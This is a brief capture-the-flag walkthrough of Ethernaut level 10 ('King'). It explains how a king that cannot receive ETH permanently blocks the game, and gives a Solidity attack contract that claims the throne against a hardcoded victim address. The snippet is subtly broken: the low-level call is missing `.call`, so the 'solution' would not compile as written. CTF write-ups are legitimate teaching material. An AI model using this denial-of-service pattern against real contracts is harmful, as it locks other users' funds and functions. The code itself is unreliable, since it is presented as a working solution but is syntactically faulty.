# Ethernaut Level 10 (King) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 10. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is to be mindful of solidity's inner workings and quirks when writing logic. In this instance, critical logic depended on the recipient of funds being able to receive them. The hack was thus to make a recipient that is not able to receive ETH, e.g., a contract without a fallback/ receive function.

#### Solution

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract CannotReceive {
    constructor() {}

    address payable victim = payable(0x3970cB8BA7a599052e1F3219c26d55CCEaE88Ad4);

    function claimKingdomForever() public payable{
        (bool success, bytes memory outputData) = victim
        {value: msg.value}("");
        require(success, "Eth transfer failed...");
    }
}
```
